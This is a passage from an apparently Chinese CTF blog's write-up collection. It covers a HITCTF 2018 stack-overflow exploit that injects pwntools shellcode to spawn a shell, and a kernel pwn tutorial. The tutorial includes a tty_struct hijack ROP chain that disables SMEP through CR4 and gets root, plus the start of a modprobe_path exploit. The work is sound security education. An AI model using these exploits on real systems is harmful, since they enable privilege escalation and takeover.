class="number">32u</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Correct password!&quot;</span>);</span><br><span class="line">    ++v1;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Incorrect password!&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> v1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以看出，在login函数中，只对用户输入的长度的数据进行字符串比较；而在check函数中，则对整个0x20长的字符串进行比较。从这也可以看出实际的密码长度为0x20。因此此题进行32长度的字符串逐位爆破即可。</p>
]]></content>
      <tags>
        <tag>pwn</tag>
        <tag>ctf</tag>
        <tag>2018</tag>
      </tags>
  </entry>
  <entry>
    <title>hitctf 2018 pwn250 DragonBall writeup</title>
    <url>/2018/04/12/hitctf18-pwn250/</url>
    <content><![CDATA[<p>此题的漏洞主要是在第4个选项，即wish函数中，在里面有栈溢出漏洞，能够利用栈溢出返回到任意地址中。用ida查看程序，需要集齐7龙珠才能许愿。初始有15元，购买1个龙珠5元，出售1个龙珠3元，在购买时进行下述检查：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> ( !money )</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;You don&#x27;t have enough money.&quot;</span>);</span><br><span class="line">money -= <span class="number">5</span>;</span><br><span class="line">++dragon_ball_num;</span><br></pre></td></tr></table></figure>
<a id="more"></a>

<p>只要金钱不为0，就可以一直购买，因此先购买1个龙珠、卖出1个龙珠，然后再连续购买7个龙珠即可。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">buy()</span><br><span class="line">sell()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, <span class="number">7</span>):</span><br><span class="line">    buy()</span><br></pre></td></tr></table></figure>

<p>保护措施如下：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">Arch:     i386-32-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX disabled</span><br><span class="line">PIE:      No PIE (0x8048000)</span><br><span class="line">RWX:      Has RWX segments</span><br></pre></td></tr></table></figure>

<p>因此我们可以让程序返回到栈上去执行我们注入的shellcode。使用pattern获取返回值的偏移，为0xa4。wish函数中，两次输入长度分别为0x64和0x40，使用pwntool生成shellcode：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">asm(shellcraft.i386.linux.sh())</span><br></pre></td></tr></table></figure>

<p>shellcode长度为44，两次输入有部分区域重叠，非重叠区域为0x68-0x38=48，刚好能够容纳得下shellcode，shellcode能完整的写入。为了使函数能够返回到栈上，我们需要泄漏栈地址信息。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">wish</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> v1; <span class="comment">// [esp+0h] [ebp-68h]</span></span><br><span class="line">  <span class="keyword">int</span> v2; <span class="comment">// [esp+30h] [ebp-38h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">memset</span>(&amp;v1, <span class="number">0</span>, <span class="number">0x60</span>u);</span><br><span class="line">  <span class="keyword">if</span> ( dragon_ball_num != <span class="number">7</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;You can&#x27;t make a wish.&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Tell me your wish: &quot;</span>);</span><br><span class="line">  read_input_raw(&amp;v1, <span class="number">0x68</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Your wish is %s, is it right?\n(Y/N) &quot;</span>, &amp;v1);</span><br><span class="line">  read_input_raw(&amp;v2, <span class="number">0x40</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;OK.&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>第一次输入的0x68长度的字符串后正好是ebp地址，因此写入长为0x68的字符串即可让printf函数打印出ebp信息：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">p.recvuntil(<span class="string">&#x27;choice: &#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">payload = <span class="string">&#x27;A&#x27;</span> * <span class="number">0x68</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvuntil(payload)</span><br><span class="line">ebp = u32(p.recv(<span class="number">4</span>))</span><br></pre></td></tr></table></figure>

<p>获取栈信息后构造新的payload拿shell：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">p.recvuntil(<span class="string">&#x27;choice: &#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">execve_sh = asm(shellcraft.i386.linux.sh())</span><br><span class="line">payload = execve_sh + <span class="string">&#x27;A&#x27;</span> * (<span class="number">0xa4</span> - len(execve_sh)) + p32(ebp - <span class="number">0x88</span>)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br><span class="line">p.close()</span><br></pre></td></tr></table></figure>

<p>0x88为main函数到shellcode的偏移，因为wish函数栈大小为0x68，main函数为0x20，因此此处为0x88。</p>
]]></content>
      <tags>
        <tag>pwn</tag>
        <tag>ctf</tag>
        <tag>2018</tag>
      </tags>
  </entry>
  <entry>
    <title>由一个Kernel Pwn引发的血案</title>
    <url>/2019/04/29/how-to-ret2usr/</url>
    <content><![CDATA[<p>趁热把kernel pwn的一些东西整理一下。</p>
<a id="more"></a>

<h3 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h3><h4 id="KASLR"><a href="#KASLR" class="headerlink" title="KASLR"></a>KASLR</h4><p>内核地址空间布局随机化，并不默认开启，需要在内核命令行中添加指定指令。</p>
<h5 id="代码段和模块基地址"><a href="#代码段和模块基地址" class="headerlink" title="代码段和模块基地址"></a>代码段和模块基地址</h5><p>通过在启动时( CONFIG_RANDOMIZE_BASE)对内核的物理和虚拟地址的基地址进行重定位。另外，随机加载基地址意味着系统每次启动以相同的顺序加载相同的模块不会共享同样的基地址。</p>
<h5 id="栈基"><a href="#栈基" class="headerlink" title="栈基"></a>栈基</h5><p>如果内核栈的基地址对于不同的进程甚至系统调用都不一样，攻击将变得很困难。</p>
<h5 id="动态内存基"><a href="#动态内存基" class="headerlink" title="动态内存基"></a>动态内存基</h5><p>根据早期启动的初始化，太多的内核动态内存（比如kmalloc, vmalloc, etc）都有相对确定性的内存布局。如果这些区域的基地址在不同的启动是不同的，攻击会受挫，从而需要特定区域的信息泄漏。</p>
<h4 id="SMEP-amp-SMAP"><a href="#SMEP-amp-SMAP" class="headerlink" title="SMEP&amp;SMAP"></a>SMEP&amp;SMAP</h4><p>SMEP是2012年在Intel Ivybridge中加入的特性，而SMAP则在2014年的Intel Broadwell中加入。其作用分别是禁止内核访问用户空间的数据和禁止内核执行用户空间的代码。当程序处于内核空间时，在保护开启的情况下，访问或执行内核数据将会发生错误。</p>
<h3 id="CISCN-2017-babydriver"><a href="#CISCN-2017-babydriver" class="headerlink" title="CISCN 2017 babydriver"></a>CISCN 2017 babydriver</h3><h4 id="UAF"><a href="#UAF" class="headerlink" title="UAF"></a>UAF</h4><p>常规方法，利用UAF修改<code>cred</code>以达到提权的目的。</p>
<h4 id="Bypass-SMEP-amp-ret2usr"><a href="#Bypass-SMEP-amp-ret2usr" class="headerlink" title="Bypass SMEP &amp; ret2usr"></a>Bypass SMEP &amp; ret2usr</h4><p>当内核开启了SMEP后，无法在内核空间直接执行用户空间代码，因此需要绕过SMEP保护来提权。系统根据CR4寄存器的第20位判断是否开启SMEP保护，CR4寄存器的值可通过诸如<code>mov cr4, xxx</code>来修改。为了关闭SMEP，通常向CR4寄存器写入0x6f0。</p>
<p>通过<code>open(&quot;/dev/ptmx&quot;, O_RDWR)</code>来让内核分配一个<code>tty_struct</code>结构体：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">tty_struct</span> &#123;</span></span><br><span class="line">    <span class="keyword">int</span> magic;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">kref</span> <span class="title">kref</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">device</span> *<span class="title">dev</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">tty_driver</span> *<span class="title">driver</span>;</span></span><br><span class="line">    <span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">tty_operations</span> *<span class="title">ops</span>;</span></span><br><span class="line">    <span class="keyword">int</span> index;</span><br><span class="line">    <span class="comment">/* Protects ldisc changes: Lock tty not pty */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ld_semaphore</span> <span class="title">ldisc_sem</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">tty_ldisc</span> *<span class="title">ldisc</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">mutex</span> <span class="title">atomic_write_lock</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">mutex</span> <span class="title">legacy_mutex</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">mutex</span> <span class="title">throttle_mutex</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">rw_semaphore</span> <span class="title">termios_rwsem</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">mutex</span> <span class="title">winsize_mutex</span>;</span></span><br><span class="line">    <span class="keyword">spinlock_t</span> ctrl_lock;</span><br><span class="line">    <span class="keyword">spinlock_t</span> flow_lock;</span><br><span class="line">    <span class="comment">/* Termios values are protected by the termios rwsem */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ktermios</span> <span class="title">termios</span>, <span class="title">termios_locked</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">termiox</span> *<span class="title">termiox</span>;</span>    <span class="comment">/* May be NULL for unsupported */</span></span><br><span class="line">    <span class="keyword">char</span> name[<span class="number">64</span>];</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">pid</span> *<span class="title">pgrp</span>;</span>       <span class="comment">/* Protected by ctrl lock */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">pid</span> *<span class="title">session</span>;</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> flags;</span><br><span class="line">    <span class="keyword">int</span> count;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">winsize</span> <span class="title">winsize</span>;</span>     <span class="comment">/* winsize_mutex */</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> stopped:<span class="number">1</span>,    <span class="comment">/* flow_lock */</span></span><br><span class="line">              flow_stopped:<span class="number">1</span>,</span><br><span class="line">              unused:BITS_PER_LONG - <span class="number">2</span>;</span><br><span class="line">    <span class="keyword">int</span> hw_stopped;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> ctrl_status:<span class="number">8</span>,    <span class="comment">/* ctrl_lock */</span></span><br><span class="line">              packet:<span class="number">1</span>,</span><br><span class="line">              unused_ctrl:BITS_PER_LONG - <span class="number">9</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> receive_room;  <span class="comment">/* Bytes free for queue */</span></span><br><span class="line">    <span class="keyword">int</span> flow_change;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">tty_struct</span> *<span class="title">link</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">fasync_struct</span> *<span class="title">fasync</span>;</span></span><br><span class="line">    <span class="keyword">wait_queue_head_t</span> write_wait;</span><br><span class="line">    <span class="keyword">wait_queue_head_t</span> read_wait;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">work_struct</span> <span class="title">hangup_work</span>;</span></span><br><span class="line">    <span class="keyword">void</span> *disc_data;</span><br><span class="line">    <span class="keyword">void</span> *driver_data;</span><br><span class="line">    <span class="keyword">spinlock_t</span> files_lock;      <span class="comment">/* protects tty_files list */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">tty_files</span>;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> N_TTY_BUF_SIZE 4096</span></span><br><span class="line">    <span class="keyword">int</span> closing;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> *write_buf;</span><br><span class="line">    <span class="keyword">int</span> write_cnt;</span><br><span class="line">    <span class="comment">/* If the tty has a pending do_SAK, queue it here - akpm */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">work_struct</span> <span class="title">SAK_work</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">tty_port</span> *<span class="title">port</span>;</span></span><br><span class="line">&#125; __randomize_layout;</span><br></pre></td></tr></table></figure>

<p>主要关注第五个成员<code>const struct tty_operations *ops</code>：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">tty_operations</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">tty_struct</span> * (*<span class="title">lookup</span>)(<span class="title">struct</span> <span class="title">tty_driver</span> *<span class="title">driver</span>,</span></span><br><span class="line"><span class="class">            <span class="title">struct</span> <span class="title">file</span> *<span class="title">filp</span>, <span class="title">int</span> <span class="title">idx</span>);</span></span><br><span class="line">    <span class="keyword">int</span>  (*install)(struct tty_driver *driver, struct tty_struct *tty);</span><br><span class="line">    <span class="keyword">void</span> (*remove)(struct tty_driver *driver, struct tty_struct *tty);</span><br><span class="line">    <span class="keyword">int</span>  (*open)(struct tty_struct * tty, struct file * filp);</span><br><span class="line">    <span class="keyword">void</span> (*close)(struct tty_struct * tty, struct file * filp);</span><br><span class="line">    <span class="keyword">void</span> (*shutdown)(struct tty_struct *tty);</span><br><span class="line">    <span class="keyword">void</span> (*cleanup)(struct tty_struct *tty);</span><br><span class="line">    <span class="keyword">int</span>  (*write)(struct tty_struct * tty,</span><br><span class="line">              <span class="keyword">const</span> <span class="keyword">unsigned</span> <span class="keyword">char</span> *buf, <span class="keyword">int</span> count);</span><br><span class="line">    <span class="keyword">int</span>  (*put_char)(struct tty_struct *tty, <span class="keyword">unsigned</span> <span class="keyword">char</span> ch);</span><br><span class="line">    <span class="keyword">void</span> (*flush_chars)(struct tty_struct *tty);</span><br><span class="line">    <span class="keyword">int</span>  (*write_room)(struct tty_struct *tty);</span><br><span class="line">    <span class="keyword">int</span>  (*chars_in_buffer)(struct tty_struct *tty);</span><br><span class="line">    <span class="keyword">int</span>  (*ioctl)(struct tty_struct *tty,</span><br><span class="line">            <span class="keyword">unsigned</span> <span class="keyword">int</span> cmd, <span class="keyword">unsigned</span> <span class="keyword">long</span> arg);</span><br><span class="line">    <span class="keyword">long</span> (*compat_ioctl)(struct tty_struct *tty,</span><br><span class="line">                 <span class="keyword">unsigned</span> <span class="keyword">int</span> cmd, <span class="keyword">unsigned</span> <span class="keyword">long</span> arg);</span><br><span class="line">    <span class="keyword">void</span> (*set_termios)(struct tty_struct *tty, struct ktermios * old);</span><br><span class="line">    <span class="keyword">void</span> (*throttle)(struct tty_struct * tty);</span><br><span class="line">    <span class="keyword">void</span> (*unthrottle)(struct tty_struct * tty);</span><br><span class="line">    <span class="keyword">void</span> (*stop)(struct tty_struct *tty);</span><br><span class="line">    <span class="keyword">void</span> (*start)(struct tty_struct *tty);</span><br><span class="line">    <span class="keyword">void</span> (*hangup)(struct tty_struct *tty);</span><br><span class="line">    <span class="keyword">int</span> (*break_ctl)(struct tty_struct *tty, <span class="keyword">int</span> state);</span><br><span class="line">    <span class="keyword">void</span> (*flush_buffer)(struct tty_struct *tty);</span><br><span class="line">    <span class="keyword">void</span> (*set_ldisc)(struct tty_struct *tty);</span><br><span class="line">    <span class="keyword">void</span> (*wait_until_sent)(struct tty_struct *tty, <span class="keyword">int</span> timeout);</span><br><span class="line">    <span class="keyword">void</span> (*send_xchar)(struct tty_struct *tty, <span class="keyword">char</span> ch);</span><br><span class="line">    <span class="keyword">int</span> (*tiocmget)(struct tty_struct *tty);</span><br><span class="line">    <span class="keyword">int</span> (*tiocmset)(struct tty_struct *tty,</span><br><span class="line">            <span class="keyword">unsigned</span> <span class="keyword">int</span> <span class="built_in">set</span>, <span class="keyword">unsigned</span> <span class="keyword">int</span> clear);</span><br><span class="line">    <span class="keyword">int</span> (*resize)(struct tty_struct *tty, struct winsize *ws);</span><br><span class="line">    <span class="keyword">int</span> (*set_termiox)(struct tty_struct *tty, struct termiox *tnew);</span><br><span class="line">    <span class="keyword">int</span> (*get_icount)(struct tty_struct *tty,</span><br><span class="line">                struct serial_icounter_struct *icount);</span><br><span class="line">    <span class="keyword">void</span> (*show_fdinfo)(struct tty_struct *tty, struct seq_file *m);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_CONSOLE_POLL</span></span><br><span class="line">    <span class="keyword">int</span> (*poll_init)(struct tty_driver *driver, <span class="keyword">int</span> line, <span class="keyword">char</span> *options);</span><br><span class="line">    <span class="keyword">int</span> (*poll_get_char)(struct tty_driver *driver, <span class="keyword">int</span> line);</span><br><span class="line">    <span class="keyword">void</span> (*poll_put_char)(struct tty_driver *driver, <span class="keyword">int</span> line, <span class="keyword">char</span> ch);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    <span class="keyword">int</span> (*proc_show)(struct seq_file *, <span class="keyword">void</span> *);</span><br><span class="line">&#125; __randomize_layout;</span><br></pre></td></tr></table></figure>

<p>它是一个函数表，当操作打开的<code>/dev/ptmx</code>时，会调用<code>tty_operations</code>中相应的函数。通过劫持函数表来<code>stack pivot</code>进而通过ROP关闭SMEP并返回到用户空间代码。<code>tty_struct</code>使用大小为0x400的<code>slab</code>（0x200～0x400，具体原因可见slab的划分），但<code>tty_operations</code>并不通过<code>slab</code>分配。</p>
<p> 解压bzImage获取vmlinux，使用Ropper获取gadget。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo apt-get install linux-headers-$(uname -r)</span><br><span class="line">sudo /usr/src/linux-headers-$(uname -r)/scripts/extract-vmlinux bzImage &gt; vmlinux</span><br><span class="line">Ropper.py --file vmlinux --nocolor &gt; gadget</span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">tty_operations.ioctl = xchg_esp_eax;</span><br><span class="line">fake_stack = mmap(xchg_esp_eax &amp; <span class="number">0xfffff000</span>, <span class="number">0x3000</span>, <span class="number">7</span>, MAP_PRIVATE | MAP_ANONYMOUS, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">rop[<span class="number">0</span>] = p_rxx;</span><br><span class="line">rop[<span class="number">1</span>] = <span class="number">0x6f0</span> ; </span><br><span class="line">rop[<span class="number">2</span>] = write_cr4; <span class="comment">// mov cr4, rxx</span></span><br><span class="line">rop[<span class="number">3</span>] = get_root;</span><br><span class="line">rop[<span class="number">4</span>] = swapgs;</span><br><span class="line">rop[<span class="number">5</span>] = iretq;</span><br><span class="line">rop[<span class="number">6</span>] = get_shell;</span><br><span class="line">rop[<span class="number">7</span>] = user_cs;</span><br><span class="line">rop[<span class="number">8</span>] = user_eflags;</span><br><span class="line">rop[<span class="number">9</span>]= user_sp;</span><br><span class="line">rop[<span class="number">10</span>]= user_ss;</span><br><span class="line"><span class="built_in">memcpy</span>(xchg_esp_eax &amp; <span class="number">0xffffffff</span>, data, <span class="keyword">sizeof</span>(data));</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">unsigned long user_cs, user_ss, user_eflags,user_sp	;</span></span><br><span class="line"><span class="comment">void save_stats() &#123;</span></span><br><span class="line"><span class="comment">	asm(</span></span><br><span class="line"><span class="comment">		&quot;movq %%cs, %0\n&quot;</span></span><br><span class="line"><span class="comment">		&quot;movq %%ss, %1\n&quot;</span></span><br><span class="line"><span class="comment">		&quot;movq %%rsp, %3\n&quot;</span></span><br><span class="line"><span class="comment">		&quot;pushfq\n&quot;</span></span><br><span class="line"><span class="comment">		&quot;popq %2\n&quot;</span></span><br><span class="line"><span class="comment">		:&quot;=r&quot;(user_cs), &quot;=r&quot;(user_ss), &quot;=r&quot;(user_eflags),&quot;=r&quot;(user_sp)</span></span><br><span class="line"><span class="comment"> 		:</span></span><br><span class="line"><span class="comment"> 		: &quot;memory&quot;</span></span><br><span class="line"><span class="comment"> 	);</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">or use mmap area for rsp</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">unsigned long user_cs, user_ss, user_rflags;</span></span><br><span class="line"><span class="comment">static void save_state() &#123;</span></span><br><span class="line"><span class="comment">        asm(</span></span><br><span class="line"><span class="comment">        &quot;movq %%cs, %0\n&quot;</span></span><br><span class="line"><span class="comment">        &quot;movq %%ss, %1\n&quot;</span></span><br><span class="line"><span class="comment">        &quot;pushfq\n&quot;</span></span><br><span class="line"><span class="comment">        &quot;popq %2\n&quot;</span></span><br><span class="line"><span class="comment">        : &quot;=r&quot; (user_cs), &quot;=r&quot; (user_ss), &quot;=r&quot; (user_rflags) : : &quot;memory&quot;);</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment">**/</span></span><br></pre></td></tr></table></figure>

<p>ROP链如上，在对打开的<code>/dev/ptmx</code>进行操作时，执行<code>xchg eax, esp</code>，这个时候<code>rax</code>的值是<code>xchg eax, esp</code>的地址，使得栈被迁移到了我们可控的地方<code>xchg_esp_eax &amp; 0xffffffff</code>。0到2步即修改CR4的值来关闭SMEP，第3步提权，接着4到5步用于返回用户空间（使用iretq指令返回到用户空间，在执行iretq之前，执行swapgs【64bit下】指令。该指令通过用一个MSR中的值交换GS寄存器的内容，用来获取指向内核数据结构的指针，然后才能执行系统调用之类的内核空间程序）。</p>
<p><code>iretq</code>栈布局：</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">|----------------------|</span><br><span class="line">| RIP                  |&lt;== low mem</span><br><span class="line">|----------------------|</span><br><span class="line">| CS                   |</span><br><span class="line">|----------------------|</span><br><span class="line">| EFLAGS               |</span><br><span class="line">|----------------------|</span><br><span class="line">| RSP                  |</span><br><span class="line">|----------------------|</span><br><span class="line">| SS                   |&lt;== high mem</span><br><span class="line">|----------------------|</span><br></pre></td></tr></table></figure>

<h3 id="0CTF-2017-knote"><a href="#0CTF-2017-knote" class="headerlink" title="0CTF 2017 knote"></a>0CTF 2017 knote</h3><p>[Working Hard]</p>
<h3 id="Midnight-Sun-CTF-Quals-hfsipc"><a href="#Midnight-Sun-CTF-Quals-hfsipc" class="headerlink" title="Midnight Sun CTF Quals hfsipc"></a>Midnight Sun CTF Quals hfsipc</h3><p><code>off-by-one</code>漏洞，能够向后溢出一个字节，slab的结构使得移出一个字节时能够直接修改<code>fd</code>。通过修改<code>fd</code>能够任意地址读写。</p>
<h4 id="Hijack-cred"><a href="#Hijack-cred" class="headerlink" title="Hijack cred"></a>Hijack cred</h4><p>找到cred所在的slab区域，将对应的0x3e8改为0x0。</p>
<h4 id="Hijack-modprobe"><a href="#Hijack-modprobe" class="headerlink" title="Hijack modprobe"></a>Hijack modprobe</h4><p>当系统遇到无法识别格式的程序时，会运行<code>modprobe_path</code>指向的程序进行调用。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sched.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/syscall.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ipc.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/sem.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CHANNEL_CREATE 0xABCD0001</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CHANNEL_DELETE 0xABCD0002</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CHANNEL_READ 0xABCD0003</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CHANNEL_WRITE 0xABCD0004</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">channel_info</span> &#123;</span></span><br><span class="line">    <span class="keyword">long</span> id;</span><br><span class="line">    <span class="keyword">long</span> size;</span><br><span class="line">    <span class="keyword">char</span> *buffer;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Create a new hfs channel</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">create_channel</span><span class="params">(<span class="keyword">int</span> fd, <span class="keyword">int</span> id, <span class="keyword">int</span> size)</span> </span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">channel_info</span> <span class="title">channel</span>;</span></span><br><span class="line"></span><br><span class="line">    channel.id = id;</span><br><span class="line">    channel.size = size;</span><br><span class="line"></span><br><span class="line">    ioctl(fd, CHANNEL_CREATE, &amp;channel);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] Create %d channel\n&quot;</span>, id);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Delete hfs channel</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">delete_channel</span><span class="params">(<span class="keyword">int</span> fd, <span class="keyword">long</span> id)</span> </span>&#123;</span><br><span class="line">    ioctl(fd, CHANNEL_DELETE, &amp;id);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] Delete %d channel\n&quot;</span>, id);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Read from hfs channel into dest</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">read_channel</span><span class="params">(<span class="keyword">int</span> fd, <span class="keyword">int</span> id, <span class="keyword">char</span> *dest, <span class="keyword">int</span> size)</span> </span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">channel_info</span> <span class="title">channel</span>;</span></span><br><span class="line"></span><br><span class="line">    channel.id = id;</span><br><span class="line">    channel.size = size;</span><br><span class="line">    channel.buffer = dest;</span><br><span class="line"></span><br><span class="line">    ioctl(fd, CHANNEL_READ, &amp;channel);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] Read %d channel\n&quot;</span>, id);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Write into hfs channel from src</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">write_channel</span><span class="params">(<span class="keyword">int</span> fd, <span class="keyword">int</span> id, <span class="keyword">char</span> *src, <span class="keyword">int</span> size)</span> </span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">channel_info</span> <span class="title">channel</span>;</span></span><br><span class="line"></span><br><span class="line">    channel.id = id;</span><br><span class="line">    channel.size = size;</span><br><span class="line">    channel.buffer = src;</span><br><span class="line"></span><br><span class="line">    ioctl(fd, CHANNEL_WRITE, &amp;channel);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] Write %d channel\n&quot;</span>, id);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">trigger</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    system(<span class="string">&quot;/home/user/ll&quot;</span>);</span><br><span class="line">    